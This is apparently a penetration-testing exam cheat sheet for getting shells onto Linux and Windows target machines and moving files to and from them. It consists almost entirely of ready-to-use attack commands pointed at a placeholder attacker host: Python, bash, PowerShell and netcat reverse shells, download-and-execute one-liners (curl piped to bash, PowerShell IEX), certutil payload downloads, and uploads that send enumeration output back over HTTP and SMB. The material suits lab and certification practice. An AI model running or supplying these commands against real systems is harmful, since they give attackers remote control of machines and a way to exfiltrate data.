# Shell Delivery and Transfer

## Port Conventions
```text
File server primary: 8000
File server fallback: 8080

Reverse shell primary: 443
Reverse shell fallback: 4444
Reverse shell extra: 80
```

# Kali

## Start the handler
```bash
penelope -O 443
```

## Fallback handler
```bash
penelope -O 4444
```

## Start the file server
```bash
python3 -m http.server 8000
```

## Fallback file server
```bash
python3 -m http.server 8080
```

## Start authenticated SMB share
```bash
impacket-smbserver share . -smb2support -username user -password pass
```

## PEASS default: ParsingPeas
```text
Use https://github.com/YuvalMil/ParsingPeas
Have it ready before the exam.
```

## PEASS workflow
```text
1. Prefer ParsingPeas if it is ready.
2. If not, run PEASS and save raw output to a file.
3. Copy or upload the raw file back to Kali.
4. View it with parsePEASS or the official PEASS parsers.
```

## PEASS fallback: official parser workflow
```bash
python3 peas2json.py peas.out peas.json
python3 json2html.py peas.json peas.html
python3 json2pdf.py peas.json peas.pdf
```

## PEASS fallback: parsePEASS
```text
Use https://github.com/mnemonic-re/parsePEASS to convert raw winPEAS or linPEAS output to HTML or PDF.
```

# Linux Target

## Primary reverse shell
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<LHOST>",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

## Fallback reverse shell
```bash
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
```

## Primary file download
```bash
curl -O http://<LHOST>:8000/file
```

## Fallback file download
```bash
wget http://<LHOST>:8000/file
```

## PEASS default: ParsingPeas Linux one-liner
```bash
curl -sSL http://<LHOST>:8005/get-script | bash
```

## PEASS fallback: run locally and copy output back
```bash
curl http://<LHOST>:8000/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.out
curl -X POST -H "X-Hostname: $(hostname)" -H "X-Scan-Type: linpeas" --data-binary @/tmp/linpeas.out http://<LHOST>:8005/upload
```

# Windows Target

## Primary reverse shell
```powershell
powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Fallback reverse shell
```cmd
nc64.exe <LHOST> 4444 -e cmd.exe
```

## Upgrade a Windows shell
```powershell
IEX(IWR http://<LHOST>:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <LHOST> 443
```

## Primary file download
```powershell
Invoke-WebRequest -Uri http://<LHOST>:8000/file.exe -OutFile C:\Temp\file.exe
```

## Fallback file download
```cmd
certutil -urlcache -split -f http://<LHOST>:8000/file.exe file.exe
```

## Bulk transfer if creds already work
```cmd
net use Z: \\<LHOST>\share /user:user pass
copy Z:\file.exe .
```

## Map SMB share to Z and stage tooling
```cmd
mkdir C:\working
cd C:\working
net use Z: \\<LHOST>\share /user:user pass
copy Z:\uploads\winPEASx64.exe .
```

## PEASS default: ParsingPeas Windows one-liner
```powershell
powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:8005/get-script.ps1')"
```

## PEASS fallback: run locally and upload output
```powershell
Invoke-WebRequest -Uri http://<LHOST>:8000/winPEASx64.exe -OutFile $env:TEMP\winPEASx64.exe
& "$env:TEMP\winPEASx64.exe" log=winpeas.out
Invoke-WebRequest -Uri http://<LHOST>:8005/upload -Method POST -Headers @{"X-Hostname"=$env:COMPUTERNAME; "X-Scan-Type"="winpeas"} -InFile $env:TEMP\winpeas.out
```

## PEASS fallback: copy output back over SMB
```cmd
copy %TEMP%\winpeas.out Z:\downloads\
```

## Rules
```text
Linux:
- python3 first
- bash second

Windows:
- PowerShell first
- nc64.exe second
- ConPtyShell only to upgrade interactivity

File transfer:
- IWR first on Windows
- certutil second on Windows
- curl first on Linux
- wget second on Linux

Do not start shopping payloads mid-box.
If the defaults fail, the box has told you something specific.
```
